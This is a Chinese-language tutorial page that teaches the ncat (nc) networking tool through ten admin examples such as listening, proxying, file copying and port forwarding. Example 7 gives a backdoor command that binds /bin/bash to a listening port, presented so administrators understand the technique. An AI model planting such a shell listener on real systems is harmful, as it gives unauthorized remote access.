<!DOCTYPE html>
<html lang="zh">
<head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="generator" content="Pelican" />
        <title>10 个例子教你学会 ncat (nc) 命令</title>
        <link rel="stylesheet" href="/theme/css/main.css" />
        <meta name="description" content="Author: Pradeep Kumar ncat 或者说 nc 是一款功能类似 cat 的工具，但是是用于网络的。它是一款拥有多种功能的 CLI 工具，可以用来在网络上读 …" />
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="/">linux_cn</a></h1>
                <nav><ul>
                    <li><a href="/category/chuan-shan-jia-zhuan-fang">穿山甲专访</a></li>
                    <li><a href="/category/dai-ma-ying-xiong">代码英雄</a></li>
                    <li><a href="/category/fen-xiang">分享</a></li>
                    <li><a href="/category/guan-dian">观点</a></li>
                    <li><a href="/category/huo-dong">活动</a></li>
                    <li><a href="/category/ji-ke-man-hua">极客漫画</a></li>
                    <li class="active"><a href="/category/ji-zhu">技术</a></li>
                    <li><a href="/category/kai-yuan-zhi-hui">开源智慧</a></li>
                    <li><a href="/category/linux-fa-xing-ban">Linux 发行版</a></li>
                    <li><a href="/category/mei-ri-an-quan-zi-xun">每日安全资讯</a></li>
                    <li><a href="/category/misc">Misc</a></li>
                    <li><a href="/category/qu-kuai-lian">区块链</a></li>
                    <li><a href="/category/rong-qi-yu-yun">容器与云</a></li>
                    <li><a href="/category/ruan-jian-kai-fa">软件开发</a></li>
                    <li><a href="/category/shu-mei-pai">树莓派</a></li>
                    <li><a href="/category/xi-tong-yun-wei">系统运维</a></li>
                    <li><a href="/category/xin-wen">新闻</a></li>
                    <li><a href="/category/ying-he-guan-cha">硬核观察</a></li>
                    <li><a href="/category/zhi-ye-sheng-ya">职业生涯</a></li>
                    <li><a href="/category/zhong-jiang-ming-dan">中奖名单</a></li>
                    <li><a href="/category/zhuo-mian-ying-yong">桌面应用</a></li>
                </ul></nav>
        </header><!-- /#banner -->
<section id="content" class="body">
  <article>
    <header>
      <h1 class="entry-title">
        <a href="/2017/12/10-ge-li-zi-jiao-ni-xue-hui-ncat-nc-ming-ling.html" rel="bookmark"
           title="Permalink to 10 个例子教你学会 ncat (nc) 命令">10 个例子教你学会 ncat (nc) 命令</a></h1>
    </header>

    <div class="entry-content">
<footer class="post-info">
        <abbr class="published" title="2017-12-31T08:01:00+01:00">
                Published: Sun 31 December 2017
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/linux-fans-from-china.html">linux fans from china</a>
        </address>
<p>In <a href="/category/ji-zhu">技术</a>.</p>

</footer><!-- /.post-info -->      <p>Author: Pradeep Kumar</p>
<p><img alt="" src="/data/attachment/album/201712/30/001853qeiznzihgh3zghqz.jpg"></p>
<p><code>ncat</code> 或者说 <code>nc</code> 是一款功能类似 <code>cat</code> 的工具，但是是用于网络的。它是一款拥有多种功能的 CLI 工具，可以用来在网络上读、写以及重定向数据。 它被设计成可以被脚本或其他程序调用的可靠的后端工具。同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。</p>
<p><code>ncat</code>/<code>nc</code> 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀。 这是每个系统管理员都应该知道并且掌握它。</p>
<p>在大多数 Debian 发行版中，<code>nc</code> 是默认可用的，它会在安装系统的过程中自动被安装。 但是在 CentOS 7 / RHEL 7 的最小化安装中，<code>nc</code> 并不会默认被安装。 你需要用下列命令手工安装。</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">root@linuxtechi ~</span><span class="o">]</span><span class="err">#</span><span class="w"> </span><span class="n">yum</span><span class="w"> </span><span class="n">install</span><span class="w"> </span><span class="n">nmap</span><span class="o">-</span><span class="n">ncat</span><span class="w"> </span><span class="o">-</span><span class="n">y</span>
</code></pre></div>

<p>系统管理员可以用它来审计系统安全，用它来找出开放的端口然后保护这些端口。 管理员还能用它作为客户端来审计 Web 服务器、telnet 服务器、邮件服务器等， 通过 <code>nc</code> 我们可以控制发送的每个字符，也可以查看对方的回应。</p>
<p>我们还可以用它捕获客户端发送的数据以此来了解这些客户端是做什么的。</p>
<p>在本文中，我们会通过 10 个例子来学习如何使用 <code>nc</code> 命令。</p>
<h3>例子： 1) 监听入站连接</h3>
<p>通过 <code>-l</code> 选项，<code>ncat</code> 可以进入监听模式，使我们可以在指定端口监听入站连接。 完整的命令是这样的：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span>port_number
</code></pre></div>

<p>比如，</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span>
</code></pre></div>

<p>服务器就会开始在 8080 端口监听入站连接。</p>
<h3>例子： 2) 连接远程系统</h3>
<p>使用下面命令可以用 <code>nc</code> 来连接远程系统，</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>IP_address<span class="w"> </span>port_number
</code></pre></div>

<p>让我们来看个例子，</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span>
</code></pre></div>

<p>这会创建一个连接，连接到 IP 为 192.168.1.100 的服务器上的 80 端口，然后我们就可以向服务器发送指令了。 比如我们可以输入下面内容来获取完整的网页内容</p>
<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>

<p>或者获取页面名称，</p>
<div class="highlight"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>

<p>或者我们可以通过以下方式获得操作系统指纹标识，</p>
<div class="highlight"><pre><span></span><code><span class="nf">HEAD</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div>

<p>这会告诉我们使用的是什么软件来运行这个 web 服务器的。</p>
<h3>例子： 3) 连接 UDP 端口</h3>
<p>默认情况下，<code>nc</code> 创建连接时只会连接 TCP 端口。 不过我们可以使用 <code>-u</code> 选项来连接到 UDP 端口，</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span>-u<span class="w"> </span><span class="m">1234</span>
</code></pre></div>

<p>现在我们的系统会开始监听 UDP 的 1234 端口，我们可以使用下面的 <code>netstat</code> 命令来验证这一点，</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>netstat<span class="w"> </span>-tunlp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">1234</span>
udp<span class="w">           </span><span class="m">0</span><span class="w">          </span><span class="m">0</span><span class="w"> </span><span class="m">0</span>.0.0.0:1234<span class="w">                 </span><span class="m">0</span>.0.0.0:*<span class="w">               </span><span class="m">17341</span>/nc
udp6<span class="w">          </span><span class="m">0</span><span class="w">          </span><span class="m">0</span><span class="w"> </span>:::1234<span class="w">                      </span>:::*<span class="w">                    </span><span class="m">17341</span>/nc
</code></pre></div>

<p>假设我们想发送或者说测试某个远程主机 UDP 端口的连通性，我们可以使用下面命令，</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-v<span class="w"> </span>-u<span class="w"> </span><span class="o">{</span>host-ip<span class="o">}</span><span class="w"> </span><span class="o">{</span>udp-port<span class="o">}</span>
</code></pre></div>

<p>比如：</p>
<div class="highlight"><pre><span></span><code><span class="o">[</span><span class="n">root@localhost ~</span><span class="o">]</span><span class="err">#</span><span class="w"> </span><span class="n">ncat</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="mf">192.168.105.150</span><span class="w"> </span><span class="mi">53</span>
<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Version</span><span class="w"> </span><span class="mf">6.40</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span><span class="w"> </span><span class="p">)</span>
<span class="nl">Ncat</span><span class="p">:</span><span class="w"> </span><span class="n">Connected</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="mf">192.168.105.150</span><span class="err">:</span><span class="mi">53</span><span class="err">。</span>
</code></pre></div>

<h3>例子： 4) 将 <code>nc</code> 作为聊天工具</h3>
<p><code>nc</code> 也可以作为聊天工具来用，我们可以配置服务器监听某个端口，然后从远程主机上连接到服务器的这个端口，就可以开始发送消息了。 在服务器这端运行：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span>
</code></pre></div>

<p>在远程客户端主机上运行：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">8080</span>
</code></pre></div>

<p>之后开始发送消息，这些消息会在服务器终端上显示出来。</p>
<h3>例子： 5) 将 <code>nc</code> 作为代理</h3>
<p><code>nc</code> 也可以用来做代理。比如下面这个例子，</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ncat<span class="w"> </span><span class="m">192</span>.168.1.200<span class="w"> </span><span class="m">80</span>
</code></pre></div>

<p>所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。 不过由于我们使用了管道，数据只能被单向传输。 要同时能够接受返回的数据，我们需要创建一个双向管道。 使用下面命令可以做到这点:</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>mkfifo<span class="w"> </span>2way
$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="m">0</span>&lt;2way<span class="w"> </span><span class="p">|</span><span class="w"> </span>ncat<span class="w"> </span><span class="m">192</span>.168.1.200<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">1</span>&gt;2way
</code></pre></div>

<p>现在你可以通过 <code>nc</code> 代理来收发数据了。</p>
<h3>例子： 6) 使用 <code>nc</code> 拷贝文件</h3>
<p><code>nc</code> 还能用来在系统间拷贝文件，虽然这么做并不推荐，因为绝大多数系统默认都安装了 <code>ssh</code>/<code>scp</code>。 不过如果你恰好遇见个没有 <code>ssh</code>/<code>scp</code> 的系统的话， 你可以用 <code>nc</code> 来作最后的努力。</p>
<p>在要接受数据的机器上启动 <code>nc</code> 并让它进入监听模式：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w">  </span><span class="m">8080</span><span class="w"> </span>&gt;<span class="w"> </span>file.txt
</code></pre></div>

<p>现在去要被拷贝数据的机器上运行下面命令：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--send-only<span class="w"> </span>&lt;<span class="w"> </span>data.txt
</code></pre></div>

<p>这里，<code>data.txt</code> 是要发送的文件。 <code>-–send-only</code> 选项会在文件拷贝完后立即关闭连接。 如果不加该选项， 我们需要手工按下 <code>ctrl+c</code> 来关闭连接。</p>
<p>我们也可以用这种方法拷贝整个磁盘分区，不过请一定要小心。</p>
<h3>例子： 7) 通过 <code>nc</code> 创建后门</h3>
<p><code>nc</code> 命令还可以用来在系统中创建后门，并且这种技术也确实被黑客大量使用。 为了保护我们的系统，我们需要知道它是怎么做的。 创建后门的命令为：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span><span class="m">10000</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
</code></pre></div>

<p><code>-e</code> 标志将一个 bash 与端口 10000 相连。现在客户端只要连接到服务器上的 10000 端口就能通过 bash 获取我们系统的完整访问权限：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">10000</span>
</code></pre></div>

<h3>例子： 8) 通过 <code>nc</code> 进行端口转发</h3>
<p>我们通过选项 <code>-c</code> 来用 <code>nc</code> 进行端口转发，实现端口转发的语法为：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-u<span class="w"> </span>-l<span class="w">  </span><span class="m">80</span><span class="w"> </span>-c<span class="w">  </span><span class="s1">&#39;ncat -u -l 8080&#39;</span>
</code></pre></div>

<p>这样，所有连接到 80 端口的连接都会转发到 8080 端口。</p>
<h3>例子： 9) 设置连接超时</h3>
<p><code>nc</code> 的监听模式会一直运行，直到手工终止。 不过我们可以通过选项 <code>-w</code> 设置超时时间:</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-w<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">8080</span>
</code></pre></div>

<p>这回导致连接 10 秒后终止，不过这个选项只能用于客户端而不是服务端。</p>
<h3>例子： 10) 使用 <code>-k</code> 选项强制 <code>nc</code> 待命</h3>
<p>当客户端从服务端断开连接后，过一段时间服务端也会停止监听。 但通过选项 <code>-k</code> 我们可以强制服务器保持连接并继续监听端口。 命令如下：</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>ncat<span class="w"> </span>-l<span class="w"> </span>-k<span class="w"> </span><span class="m">8080</span>
</code></pre></div>

<p>现在即使来自客户端的连接断了也依然会处于待命状态。</p>
<p>自此我们的教程就完了，如有疑问，请在下方留言。</p>
    </div><!-- /.entry-content -->

  </article>
</section>
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>links</h2>
                        <ul>
                            <li><a href="https://getpelican.com/">Pelican</a></li>
                            <li><a href="https://www.python.org/">Python.org</a></li>
                            <li><a href="https://palletsprojects.com/p/jinja/">Jinja2</a></li>
                            <li><a href="#">You can modify those links in your config file</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>

                            <li><a href="#">You can add links in your config file</a></li>
                            <li><a href="#">Another social link</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a rel="nofollow" href="https://getpelican.com/">Pelican</a>, which takes great advantage of <a rel="nofollow" href="https://www.python.org/">Python</a>.
                </address><!-- /#about -->

                <p>The theme is by <a rel="nofollow" href="https://www.smashingmagazine.com/2009/08/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
        </footer><!-- /#contentinfo -->

</body>
</html>